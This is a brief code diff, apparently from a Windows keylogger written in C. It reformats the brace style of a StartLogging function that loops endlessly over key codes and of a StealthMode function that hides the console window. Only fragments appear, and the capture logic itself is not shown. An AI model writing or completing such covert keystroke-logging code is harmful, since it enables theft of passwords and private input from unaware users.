@@ -14,8 +14,7 @@ int main() {
     return 0;
 }
 
-void StartLogging()
-{
+void StartLogging() {
     char c;
     for(;;) {
         for(c=8;c<=222;c++) {
@@ -136,8 +135,7 @@ void StartLogging()
     }
 }
 
-void StealthMode() 
-{
+void StealthMode() {
     HWND stealth;
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
